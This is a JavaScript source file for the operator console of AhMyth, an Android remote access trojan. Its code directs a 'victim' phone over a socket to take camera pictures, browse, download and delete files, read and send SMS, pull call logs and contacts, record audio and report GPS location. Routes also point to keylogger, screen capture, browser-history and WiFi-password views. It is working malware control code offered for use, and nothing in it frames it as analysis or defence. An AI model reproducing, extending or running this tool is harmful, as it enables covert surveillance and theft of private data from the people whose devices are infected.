const { remote } = require('electron');
const { ipcRenderer } = require('electron');
var app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
var fs = require("fs-extra");
var homedir = require('node-homedir');
var path = require("path");

// Fix Constants require path - use path resolution that works in Electron renderer
let CONSTANTS;
try {
    // Try relative path first (works when script is loaded as module)
    CONSTANTS = require('../Constants');
} catch (e) {
    try {
        // Fallback: resolve from app directory using remote
        if (remote && remote.app) {
            const appPath = path.resolve(remote.app.getAppPath(), 'app', 'assets', 'js', 'Constants.js');
            CONSTANTS = require(appPath);
        } else {
            // Last resort: try resolving from known structure
            const constantsPath = path.resolve(__dirname || process.cwd(), 'app', 'assets', 'js', 'Constants.js');
            CONSTANTS = require(constantsPath);
        }
    } catch (e2) {
        console.error('Failed to load Constants:', e2);
        // Create a minimal fallback to prevent complete failure
        CONSTANTS = {
            order: 'order',
            orders: {
                camera: 'x0000ca',
                fileManager: 'x0000fm',
                calls: 'x0000cl',
                sms: 'x0000sm',
                mic: 'x0000mc',
                location: 'x0000lm',
                contacts: 'x0000cn',
                deviceInfo: 'x0000di',
                apps: 'x0000ap',
                clipboard: 'x0000cb',
                wifi: 'x0000wf',
                screen: 'x0000sc'
            },
            logStatus: { SUCCESS: 1, FAIL: 0, INFO: 2, WARNING: 3 },
            logColors: { RED: "red", GREEN: "lime", ORANGE: "orange", YELLOW: "yellow", DEFAULT: "#82eefd" },
            dataDir: 'AhMyth',
            downloadPath: 'Downloads',
            outputApkPath: 'Output'
        };
    }
}

var ORDER = CONSTANTS.order;
var originalSocket = remote.getCurrentWebContents().victim;

var dataPath = path.join(homedir(), CONSTANTS.dataDir);
var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
var logPath = path.join(dataPath, 'Logs');

// Ensure log directory exists
if (!fs.existsSync(logPath)) {
    fs.mkdirSync(logPath, { recursive: true });
}

// Debug log file
var debugLogFile = path.join(logPath, `debug-${new Date().toISOString().split('T')[0]}.log`);

// Log to file function
function logToFile(type, command, data) {
    const timestamp = new Date().toISOString();
    const dataStr = typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data || '');
    const truncatedData = dataStr.length > 5000 ? dataStr.substring(0, 5000) + '\n...[truncated]' : dataStr;
    const logEntry = `\n[${timestamp}] [${type}] ${command}\n${'='.repeat(60)}\n${truncatedData}\n`;
    
    try {
        fs.appendFileSync(debugLogFile, logEntry);
    } catch (e) {
        console.error('Error writing to debug log:', e);
    }
    
    // Also log to console for immediate visibility
    console.log(`[AhMyth ${type}] ${command}:`, dataStr.substring(0, 500));
}

// Wrap socket with logging
var socket = {
    emit: function(event, data) {
        logToFile('REQUEST', event, data);
        return originalSocket.emit(event, data);
    },
    on: function(event, callback) {
        return originalSocket.on(event, function(data) {
            logToFile('RESPONSE', event, data);
            callback(data);
        });
    },
    removeAllListeners: function(event) {
        return originalSocket.removeAllListeners(event);
    }
};

//-----------------------Routing Config------------------------
app.config(function ($routeProvider, $locationProvider) {
    // Configure location provider for hash-based routing (works better in Electron)
    $locationProvider.hashPrefix('');
    
    $routeProvider
        .when("/", {
            templateUrl: "views/main.html"
        })
        .when("/camera", {
            templateUrl: "views/camera.html",
            controller: "CamCtrl"
        })
        .when("/fileManager", {
            templateUrl: "views/fileManager.html",
            controller: "FmCtrl"
        })
        .when("/smsManager", {
            templateUrl: "views/smsManager.html",
            controller: "SMSCtrl"
        })
        .when("/callsLogs", {
            templateUrl: "views/callsLogs.html",
            controller: "CallsCtrl"
        })
        .when("/contacts", {
            templateUrl: "views/contacts.html",
            controller: "ContCtrl"
        })
        .when("/mic", {
            templateUrl: "views/mic.html",
            controller: "MicCtrl"
        })
        .when("/location", {
            templateUrl: "views/location.html",
            controller: "LocCtrl"
        })
        .when("/deviceInfo", {
            templateUrl: "views/deviceInfo.html",
            controller: "DeviceInfoCtrl"
        })
        .when("/apps", {
            templateUrl: "views/apps.html",
            controller: "AppsCtrl"
        })
        .when("/clipboard", {
            templateUrl: "views/clipboard.html",
            controller: "ClipboardCtrl"
        })
        .when("/wifi", {
            templateUrl: "views/wifi.html",
            controller: "WiFiCtrl"
        })
        .when("/screen", {
            templateUrl: "views/screen.html",
            controller: "ScreenCtrl"
        })
        .when("/keylogger", {
            templateUrl: "views/keylogger.html",
            controller: "KeyloggerCtrl"
        })
        .when("/browserHistory", {
            templateUrl: "views/browserHistory.html",
            controller: "BrowserHistoryCtrl"
        })
        .when("/notifications", {
            templateUrl: "views/notifications.html",
            controller: "NotificationsCtrl"
        })
        .when("/systemInfo", {
            templateUrl: "views/systemInfo.html",
            controller: "SystemInfoCtrl"
        })
        .when("/makeCall", {
            templateUrl: "views/makeCall.html",
            controller: "MakeCallCtrl"
        })
        .when("/liveMic", {
            templateUrl: "views/liveMic.html",
            controller: "LiveMicCtrl"
        })
        .when("/wifiPasswords", {
            templateUrl: "views/wifiPasswords.html",
            controller: "WiFiPasswordsCtrl"
        })
        .otherwise({
            redirectTo: '/'
        });
});



//-----------------------LAB Controller (lab.htm)------------------------
// controller for Lab.html and its views mic.html,camera.html..etc
app.controller("LabCtrl", function ($scope, $rootScope, $location, $route) {
    $labCtrl = $scope;
    $labCtrl.logs = [];

    // Wait for DOM to be ready and initialize routing
    setTimeout(() => {
        var log = document.getElementById("logy");
        if (!log) {
            console.error("[AhMyth Lab] Logy element not found!");
        }
        
        // Ensure routing is initialized - navigate to default route if no route is set
        if ($location.path() === '' || $location.path() === '/') {
            $location.path('/');
            $scope.$apply();
        }
        
        console.log('[AhMyth Lab] Controller initialized, current path:', $location.path());
    }, 100);

    // Handle remote module with fallback
    let electronWindow;
    try {
        electronWindow = remote.getCurrentWindow();
    } catch (e) {
        console.error("[AhMyth Lab] Remote module not available:", e);
        electronWindow = null;
    }

    $labCtrl.close = () => {
        if (electronWindow) {
            electronWindow.close();
        } else {
            ipcRenderer.send('window-close');
        }
    };

    $labCtrl.minimize = () => {
        if (electronWindow) {
            electronWindow.minimize();
        } else {
            ipcRenderer.send('window-minimize');
        }
    };

    $labCtrl.maximize = () => {
        if (electronWindow) {
            if (electronWindow.isMaximized()) {
                electronWindow.unmaximize(); // Restore the window size
            } else {
                electronWindow.maximize(); // Maximize the window
            }
        } else {
            ipcRenderer.send('window-maximize');
        }
    };

    // Global permission request function - available to all controllers
    $rootScope.requestPermission = (permissionType) => {
        const permOrder = CONSTANTS.orders.requestPermission || 'x0000rp';
        $rootScope.Log(`[→] Requesting ${permissionType} permission on device...`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: permOrder, permission: permissionType });
    };

    // Listen for permission request responses
    socket.on('x0000rp', (data) => {
        if (data.success) {
            $rootScope.Log(`[✓] Permission request shown: ${data.permission}`, CONSTANTS.logStatus.SUCCESS);
        } else if (data.error) {
            $rootScope.Log(`[✗] Permission error: ${data.error}`, CONSTANTS.logStatus.FAIL);
        } else if (data.granted) {
            $rootScope.Log(`[✓] Permission granted: ${data.permission}`, CONSTANTS.logStatus.SUCCESS);
        }
        if (!$rootScope.$$phase) {
            $rootScope.$apply();
        }
    });

    // Enhanced logging with timestamps
    $rootScope.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;
        else if (status == CONSTANTS.logStatus.INFO)
            fontColor = CONSTANTS.logColors.YELLOW;
        else if (status == CONSTANTS.logStatus.WARNING)
            fontColor = CONSTANTS.logColors.ORANGE;

        const now = new Date();
        const timestamp = now.toLocaleString('en-US', {
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });

        $labCtrl.logs.push({ 
            date: `[${timestamp}]`, 
            msg: msg, 
            color: fontColor 
        });
        
        // Ensure log element exists before scrolling
        setTimeout(() => {
            var log = document.getElementById("logy");
            if (log) {
                log.scrollTop = log.scrollHeight;
            }
        }, 0);
        
        if (!$labCtrl.$$phase) {
            $labCtrl.$apply();
        }
    }

    //fired when notified from Main Proccess (main.js) about
    // this victim who disconnected
    ipcRenderer.on('SocketIO:VictimDisconnected', (event) => {
        $rootScope.Log('[✗] Victim disconnected', CONSTANTS.logStatus.FAIL);
    });


    //fired when notified from the Main Process (main.js) about
    // the Server disconnection
    ipcRenderer.on('SocketIO:ServerDisconnected', (event) => {
        $rootScope.Log('[⚠] Server disconnected', CONSTANTS.logStatus.WARNING);
    });




    // to move from view to another
    $labCtrl.goToPage = (page) => {
        try {
            const path = '/' + page;
            console.log('[AhMyth Lab] Navigating to:', path);
            $location.path(path);
            if (!$scope.$$phase && !$scope.$root.$$phase) {
                $scope.$apply();
            }
        } catch (error) {
            console.error('[AhMyth Lab] Navigation error:', error);
            $rootScope.Log(`[✗] Failed to navigate to ${page}`, CONSTANTS.logStatus.FAIL);
        }
    }
    
    // Handle route change errors
    $scope.$on('$routeChangeError', function(event, current, previous, rejection) {
        console.error('[AhMyth Lab] Route change error:', rejection);
        $rootScope.Log('[✗] Failed to load view: ' + (rejection || 'Unknown error'), CONSTANTS.logStatus.FAIL);
    });
    
    // Handle successful route changes
    $scope.$on('$routeChangeSuccess', function(event, current, previous) {
        if (current && current.$$route) {
            console.log('[AhMyth Lab] Route changed to:', current.$$route.originalPath);
        }
    });





});






//-----------------------Camera Controller (camera.htm)------------------------
// camera controller
app.controller("CamCtrl", function ($scope, $rootScope) {
    $camCtrl = $scope;
    $camCtrl.isSaveShown = false;
    $camCtrl.cameras = [];
    $camCtrl.selectedCam = null;
    $camCtrl.imgUrl = null;
    $camCtrl.load = '';
    var camera = CONSTANTS.orders.camera;
    var currentBase64 = null;

    // remove socket listener
    $camCtrl.$on('$destroy', () => {
        socket.removeAllListeners(camera);
    });

    // Select camera
    $camCtrl.selectCamera = (cam) => {
        $camCtrl.selectedCam = cam;
        $rootScope.Log(`[ℹ] Selected: ${cam.name || (cam.id == 0 ? 'Back Camera' : 'Front Camera')}`, CONSTANTS.logStatus.INFO);
    };

    // Take picture
    $camCtrl.snap = () => {
        if (!$camCtrl.selectedCam) {
            $rootScope.Log('[⚠] Please select a camera first', CONSTANTS.logStatus.WARNING);
            return;
        }
        $camCtrl.load = 'loading';
        $rootScope.Log('[→] Taking picture...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: camera, extra: String($camCtrl.selectedCam.id) });
    };

    // Save photo
    $camCtrl.savePhoto = () => {
        if (!currentBase64) return;
        $rootScope.Log('[→] Saving picture...', CONSTANTS.logStatus.INFO);
        var picPath = path.join(downloadsPath, Date.now() + ".jpg");
        fs.outputFile(picPath, Buffer.from(currentBase64, "base64"), (err) => {
            if (!err)
                $rootScope.Log(`[✓] Picture saved: ${picPath}`, CONSTANTS.logStatus.SUCCESS);
            else
                $rootScope.Log('[✗] Failed to save picture', CONSTANTS.logStatus.FAIL);
        });
    };

    // Fullscreen - open in new window
    $camCtrl.fullscreen = () => {
        if ($camCtrl.imgUrl) {
            let win = window.open();
            win.document.write('<img src="' + $camCtrl.imgUrl + '" style="max-width:100%;height:auto;">');
        }
    };

    // Socket handler
    socket.on(camera, (data) => {
        $camCtrl.load = '';
        
        if (data.camList == true) {
            $rootScope.Log(`[✓] Found ${data.list.length} camera(s)`, CONSTANTS.logStatus.SUCCESS);
            $camCtrl.cameras = data.list;
            // Auto-select first camera
            if (data.list.length > 0) {
                $camCtrl.selectedCam = data.list[0];
            }
            $camCtrl.$apply();
        } else if (data.image == true) {
            $rootScope.Log('[✓] Picture captured', CONSTANTS.logStatus.SUCCESS);
            
            // Convert binary to base64
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            currentBase64 = window.btoa(binary);
            
            $camCtrl.imgUrl = 'data:image/jpeg;base64,' + currentBase64;
            $camCtrl.isSaveShown = true;
            $camCtrl.$apply();
        }
    });

    // Initial load - get camera list
    $rootScope.Log('[→] Fetching camera list...', CONSTANTS.logStatus.INFO);
    $camCtrl.load = 'loading';
    socket.emit(ORDER, { order: camera, extra: 'camList' });
});






//-----------------------File Controller (fileManager.htm)------------------------
// File controller
app.controller("FmCtrl", function ($scope, $rootScope) {
    $fmCtrl = $scope;
    $fmCtrl.load = 'loading';
    $fmCtrl.files = [];
    $fmCtrl.currentPath = '/storage/emulated/0';
    $fmCtrl.pathHistory = [];
    $fmCtrl.canGoBack = false;
    $fmCtrl.pathParts = [];
    $fmCtrl.folderCount = 0;
    $fmCtrl.fileCount = 0;
    $fmCtrl.totalSize = 0;
    var fileManager = CONSTANTS.orders.fileManager;

    // remove socket listener
    $fmCtrl.$on('$destroy', () => {
        socket.removeAllListeners(fileManager);
    });

    // infinite scrolling
    $fmCtrl.barLimit = 50;
    $fmCtrl.increaseLimit = () => {
        $fmCtrl.barLimit += 50;
    };

    // Update path parts for breadcrumb
    function updatePathParts(path) {
        $fmCtrl.pathParts = [];
        if (!path || path === '/') return;
        
        let parts = path.split('/').filter(p => p);
        let currentPath = '';
        parts.forEach(part => {
            currentPath += '/' + part;
            $fmCtrl.pathParts.push({ name: part, path: currentPath });
        });
    }

    // Update file stats
    function updateStats() {
        $fmCtrl.folderCount = $fmCtrl.files.filter(f => f.isDir).length;
        $fmCtrl.fileCount = $fmCtrl.files.filter(f => !f.isDir).length;
        $fmCtrl.totalSize = $fmCtrl.files.reduce((acc, f) => acc + (f.size || 0), 0);
    }

    // Format file size
    $fmCtrl.formatSize = (bytes) => {
        if (!bytes || bytes === 0) return '0 B';
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(1024));
        return (bytes / Math.pow(1024, i)).toFixed(1) + ' ' + sizes[i];
    };

    // Navigate to path
    $fmCtrl.goToPath = (path) => {
        if (path) {
            $fmCtrl.pathHistory.push($fmCtrl.currentPath);
            $fmCtrl.canGoBack = true;
            $fmCtrl.currentPath = path;
            $fmCtrl.load = 'loading';
            $fmCtrl.barLimit = 50;
            updatePathParts(path);
            $rootScope.Log(`[→] Opening: ${path}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: path });
        }
    };

    // Go back
    $fmCtrl.goBack = () => {
        if ($fmCtrl.pathHistory.length > 0) {
            let prevPath = $fmCtrl.pathHistory.pop();
            $fmCtrl.canGoBack = $fmCtrl.pathHistory.length > 0;
            $fmCtrl.currentPath = prevPath;
            $fmCtrl.load = 'loading';
            $fmCtrl.barLimit = 50;
            updatePathParts(prevPath);
            $rootScope.Log(`[→] Going back to: ${prevPath}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: prevPath });
        }
    };

    // Go home
    $fmCtrl.goHome = () => {
        $fmCtrl.pathHistory = [];
        $fmCtrl.canGoBack = false;
        $fmCtrl.goToPath('/storage/emulated/0');
    };

    // Refresh current directory
    $fmCtrl.refreshDir = () => {
        $fmCtrl.load = 'loading';
        $fmCtrl.barLimit = 50;
        $rootScope.Log(`[→] Refreshing: ${$fmCtrl.currentPath}`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
    };

    // Copy path to clipboard
    $fmCtrl.copyPath = () => {
        if (navigator.clipboard) {
            navigator.clipboard.writeText($fmCtrl.currentPath);
            $rootScope.Log('[✓] Path copied to clipboard', CONSTANTS.logStatus.SUCCESS);
        }
    };

    // When folder/file is clicked
    $fmCtrl.getFiles = (item) => {
        if (item && item.isDir) {
            let newPath = item.path || ($fmCtrl.currentPath + '/' + item.name);
            $fmCtrl.goToPath(newPath);
        }
    };

    // Save/download file
    $fmCtrl.saveFile = (filePath) => {
        $rootScope.Log(`[→] Downloading: ${filePath}`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: fileManager, extra: 'dl', path: filePath });
    };

    // Delete file/folder
    $fmCtrl.deleteFile = (filePath, fileName) => {
        if (confirm(`Are you sure you want to delete "${fileName}"?`)) {
            $rootScope.Log(`[→] Deleting: ${filePath}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: fileManager, extra: 'delete', path: filePath });
        }
    };

    // Socket handler
    socket.on(fileManager, (data) => {
        if (data.deleted !== undefined) {
            // Delete response
            if (data.deleted) {
                $rootScope.Log(`[✓] Deleted: ${data.path}`, CONSTANTS.logStatus.SUCCESS);
                // Refresh current directory
                socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
            } else {
                $rootScope.Log(`[✗] Failed to delete: ${data.path}`, CONSTANTS.logStatus.FAIL);
            }
        } else if (data.file == true) {
            // File download response
            $rootScope.Log('[→] Downloading file...', CONSTANTS.logStatus.INFO);
            var filePath = path.join(downloadsPath, data.name);
            fs.outputFile(filePath, data.buffer, (err) => {
                if (err)
                    $rootScope.Log('[✗] Failed to save file', CONSTANTS.logStatus.FAIL);
                else
                    $rootScope.Log(`[✓] File saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
            });
        } else if (Array.isArray(data) && data.length > 0) {
            // Directory listing response
            $rootScope.Log(`[✓] Found ${data.length} items`, CONSTANTS.logStatus.SUCCESS);
            $fmCtrl.load = '';
            $fmCtrl.files = data.sort((a, b) => {
                // Folders first, then alphabetical
                if (a.isDir && !b.isDir) return -1;
                if (!a.isDir && b.isDir) return 1;
                return (a.name || '').localeCompare(b.name || '');
            });
            updateStats();
            $fmCtrl.$apply();
        } else {
            $rootScope.Log('[⚠] Directory empty or access denied', CONSTANTS.logStatus.WARNING);
            $fmCtrl.load = '';
            $fmCtrl.files = [];
            updateStats();
            $fmCtrl.$apply();
        }
    });

    // Initial load
    $rootScope.Log('[→] Loading file manager...', CONSTANTS.logStatus.INFO);
    updatePathParts($fmCtrl.currentPath);
    socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
});








//-----------------------SMS Controller (sms.htm)------------------------
// SMS controller
app.controller("SMSCtrl", function ($scope, $rootScope) {
    $SMSCtrl = $scope;
    var sms = CONSTANTS.orders.sms;
    $SMSCtrl.smsList = [];
    $('.menu .item')
        .tab();

    $SMSCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(sms);
    });


    // send request to victim to bring all sms
    $SMSCtrl.getSMSList = () => {
        $SMSCtrl.load = 'loading';
        $SMSCtrl.barLimit = 50;
        $rootScope.Log('[→] Fetching SMS list...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: sms, extra: 'ls' });
    }

    $SMSCtrl.increaseLimit = () => {
        $SMSCtrl.barLimit += 50;
    }

    // send request to victim to send sms
    $SMSCtrl.SendSMS = (phoneNo, msg) => {
        $rootScope.Log(`[→] Sending SMS to ${phoneNo}...`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });
    }

    // save sms list to csv file
    $SMSCtrl.SaveSMS = () => {

        if ($SMSCtrl.smsList.length == 0)
            return;


        var csvRows = [];
        for (var i = 0; i < $SMSCtrl.smsList.length; i++) {
            csvRows.push($SMSCtrl.smsList[i].phoneNo + "," + $SMSCtrl.smsList[i].msg);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
        $rootScope.Log("[→] Saving SMS list...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log(`[✗] Failed to save: ${csvPath}`, CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] SMS list saved: ${csvPath}`, CONSTANTS.logStatus.SUCCESS);

        });

    }


    //listening for victim response
    socket.on(sms, (data) => {
        if (data.smsList) {
            $SMSCtrl.load = '';
            $rootScope.Log(`[✓] SMS list received: ${data.smsList.length} messages`, CONSTANTS.logStatus.SUCCESS);
            $SMSCtrl.smsList = data.smsList;
            $SMSCtrl.smsSize = data.smsList.length;
            $SMSCtrl.$apply();
        } else {
            if (data == true)
                $rootScope.Log('[✓] SMS sent successfully', CONSTANTS.logStatus.SUCCESS);
            else
                $rootScope.Log('[✗] Failed to send SMS', CONSTANTS.logStatus.FAIL);
        }
    });



});










//-----------------------Calls Controller (callslogs.htm)------------------------
// Calls controller
app.controller("CallsCtrl", function ($scope, $rootScope) {
    $CallsCtrl = $scope;
    $CallsCtrl.callsList = [];
    var calls = CONSTANTS.orders.calls;

    $CallsCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(calls);
    });

    $CallsCtrl.load = 'loading';
    $rootScope.Log('[→] Fetching call logs...', CONSTANTS.logStatus.INFO);
    socket.emit(ORDER, { order: calls });


    $CallsCtrl.barLimit = 50;
    $CallsCtrl.increaseLimit = () => {
        $CallsCtrl.barLimit += 50;
    }


    $CallsCtrl.SaveCalls = () => {
        if ($CallsCtrl.callsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $CallsCtrl.callsList.length; i++) {
            var type = (($CallsCtrl.callsList[i].type) == 1 ? "INCOMING" : "OUTGOING");
            var name = (($CallsCtrl.callsList[i].name) == null ? "Unknown" : $CallsCtrl.callsList[i].name);
            csvRows.push($CallsCtrl.callsList[i].phoneNo + "," + name + "," + $CallsCtrl.callsList[i].duration + "," + type);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Calls_" + Date.now() + ".csv");
        $rootScope.Log("[→] Saving call logs...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log(`[✗] Failed to save: ${csvPath}`, CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Call logs saved: ${csvPath}`, CONSTANTS.logStatus.SUCCESS);

        });

    }

    socket.on(calls, (data) => {
        if (data.callsList) {
            $CallsCtrl.load = '';
            $rootScope.Log(`[✓] Call logs received: ${data.callsList.length} entries`, CONSTANTS.logStatus.SUCCESS);
            $CallsCtrl.callsList = data.callsList;
            $CallsCtrl.logsSize = data.callsList.length;
            $CallsCtrl.$apply();
        }
    });



});





//-----------------------Contacts Controller (contacts.htm)------------------------
// Contacts controller
app.controller("ContCtrl", function ($scope, $rootScope) {
    $ContCtrl = $scope;
    $ContCtrl.contactsList = [];
    var contacts = CONSTANTS.orders.contacts;

    $ContCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(contacts);
    });

    $ContCtrl.load = 'loading';
    $rootScope.Log('[→] Fetching contacts...', CONSTANTS.logStatus.INFO);
    socket.emit(ORDER, { order: contacts });

    $ContCtrl.barLimit = 50;
    $ContCtrl.increaseLimit = () => {
        $ContCtrl.barLimit += 50;
    }

    $ContCtrl.SaveContacts = () => {

        if ($ContCtrl.contactsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $ContCtrl.contactsList.length; i++) {
            csvRows.push($ContCtrl.contactsList[i].phoneNo + "," + $ContCtrl.contactsList[i].name);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Contacts_" + Date.now() + ".csv");
        $rootScope.Log("[→] Saving contacts...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log(`[✗] Failed to save: ${csvPath}`, CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Contacts saved: ${csvPath}`, CONSTANTS.logStatus.SUCCESS);

        });

    }

    socket.on(contacts, (data) => {
        if (data.contactsList) {
            $ContCtrl.load = '';
            $rootScope.Log(`[✓] Contacts received: ${data.contactsList.length} contacts`, CONSTANTS.logStatus.SUCCESS);
            $ContCtrl.contactsList = data.contactsList;
            $ContCtrl.contactsSize = data.contactsList.length;
            $ContCtrl.$apply();
        }
    });





});




//-----------------------Mic Controller (mic.htm)------------------------
// Mic controller
app.controller("MicCtrl", function ($scope, $rootScope) {
    $MicCtrl = $scope;
    $MicCtrl.isAudio = true;
    var mic = CONSTANTS.orders.mic;

    $MicCtrl.$on('$destroy', function () {
        // release resources, cancel Listner...
        socket.removeAllListeners(mic);
    });

    $MicCtrl.Record = (seconds) => {

        if (seconds) {
            if (seconds > 0) {
                $rootScope.Log(`[→] Recording audio for ${seconds} seconds...`, CONSTANTS.logStatus.INFO);
                socket.emit(ORDER, { order: mic, sec: seconds });
            } else
                $rootScope.Log('[⚠] Recording duration must be greater than 0', CONSTANTS.logStatus.WARNING);

        }

    }


    socket.on(mic, (data) => {
        if (data.file == true) {
            $rootScope.Log('[✓] Audio recording received', CONSTANTS.logStatus.SUCCESS);

            var player = document.getElementById('player');
            var sourceMp3 = document.getElementById('sourceMp3');
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $MicCtrl.isAudio = false;
            $MicCtrl.$apply();
            sourceMp3.src = "data:audio/mp3;base64," + base64String;
            player.load();
            player.play();

            $MicCtrl.SaveAudio = () => {
                $rootScope.Log('[→] Saving audio file...', CONSTANTS.logStatus.INFO);
                var filePath = path.join(downloadsPath, data.name);
                fs.outputFile(filePath, data.buffer, (err) => {
                    if (err)
                        $rootScope.Log('[✗] Failed to save audio', CONSTANTS.logStatus.FAIL);
                    else
                        $rootScope.Log(`[✓] Audio saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
                });


            };



        }

    });
});





//-----------------------Location Controller (location.htm)------------------------
// Location controller - FIXED
app.controller("LocCtrl", function ($scope, $rootScope, $timeout) {
    $LocCtrl = $scope;
    var location = CONSTANTS.orders.location;
    $LocCtrl.currentLocation = null;
    $LocCtrl.lastUpdate = null;
    
    var map = null;
    var marker = null;

    $LocCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(location);
        if (map) {
            map.remove();
            map = null;
        }
    });

    // Initialize map after DOM is ready
    function initMap() {
        $timeout(() => {
            const mapContainer = document.getElementById('mapid');
            if (mapContainer && !map) {
                try {
                    // Set explicit dimensions
                    mapContainer.style.width = '100%';
                    mapContainer.style.height = '400px';
                    mapContainer.style.minHeight = '400px';
                    
                    // Initialize Leaflet map
                    map = L.map('mapid', {
                        center: [51.505, -0.09],
                        zoom: 13,
                        zoomControl: true,
                        attributionControl: true
                    });
                    
                    // Use OpenStreetMap tiles (most reliable, no API key needed)
                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>',
                        maxZoom: 19,
                        subdomains: ['a', 'b', 'c']
                    }).addTo(map);
                    
                    // Force map to recalculate size multiple times
                    var resizeMap = function() {
                        if (map) {
                            map.invalidateSize(true);
                        }
                    };
                    setTimeout(resizeMap, 100);
                    setTimeout(resizeMap, 300);
                    setTimeout(resizeMap, 500);
                    setTimeout(resizeMap, 1000);
                    setTimeout(resizeMap, 2000);
                    
                    // Also resize on window resize
                    window.addEventListener('resize', resizeMap);
                    
                    $rootScope.Log('[✓] Map initialized successfully', CONSTANTS.logStatus.SUCCESS);
                } catch (e) {
                    console.error('[AhMyth] Map initialization error:', e);
                    $rootScope.Log('[✗] Failed to initialize map: ' + e.message, CONSTANTS.logStatus.FAIL);
                }
            } else if (!mapContainer) {
                // Retry after a short delay
                $timeout(initMap, 200);
            }
        }, 100);
    }

    // Initialize map
    initMap();

    $LocCtrl.Refresh = () => {
        $LocCtrl.load = 'loading';
        $rootScope.Log('[→] Requesting GPS location...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: location });
    }

    // Auto-request location on load
    $timeout(() => {
        $LocCtrl.load = 'loading';
        $rootScope.Log('[→] Requesting GPS location...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: location });
    }, 500);

    socket.on(location, (data) => {
        $LocCtrl.load = '';
        
        if (data.enable) {
            if (data.lat == 0 && data.lng == 0) {
                $rootScope.Log('[⚠] Location unavailable, please try again', CONSTANTS.logStatus.WARNING);
            } else {
                $rootScope.Log(`[✓] Location received: ${data.lat.toFixed(6)}, ${data.lng.toFixed(6)}`, CONSTANTS.logStatus.SUCCESS);
                
                // Update current location
                $LocCtrl.currentLocation = {
                    lat: data.lat.toFixed(6),
                    lng: data.lng.toFixed(6),
                    accuracy: data.accuracy ? `${data.accuracy}m` : null
                };
                $LocCtrl.lastUpdate = new Date().toLocaleTimeString();
                
                var victimLoc = new L.LatLng(data.lat, data.lng);
                
                // Wait for map to be ready
                if (map) {
                    if (!marker) {
                        // Create custom marker icon
                        var markerIcon = L.divIcon({
                            className: 'custom-marker',
                            html: '<div style="width: 20px; height: 20px; background: #00d4aa; border: 3px solid #fff; border-radius: 50%; box-shadow: 0 0 10px rgba(0,212,170,0.5);"></div>',
                            iconSize: [20, 20],
                            iconAnchor: [10, 10]
                        });
                        marker = L.marker(victimLoc, { icon: markerIcon }).addTo(map);
                        marker.bindPopup(`<b>Device Location</b><br>Lat: ${data.lat.toFixed(6)}<br>Lng: ${data.lng.toFixed(6)}`);
                    } else {
                        marker.setLatLng(victimLoc).update();
                        marker.setPopupContent(`<b>Device Location</b><br>Lat: ${data.lat.toFixed(6)}<br>Lng: ${data.lng.toFixed(6)}`);
                    }
                    
                    map.setView(victimLoc, 15);
                    
                    // Invalidate size to ensure proper rendering
                    setTimeout(() => {
                        map.invalidateSize();
                    }, 100);
                }
            }
        } else {
            $rootScope.Log('[✗] Location service is disabled on device', CONSTANTS.logStatus.FAIL);
        }
        
        if (!$LocCtrl.$$phase) {
            $LocCtrl.$apply();
        }
    });

});

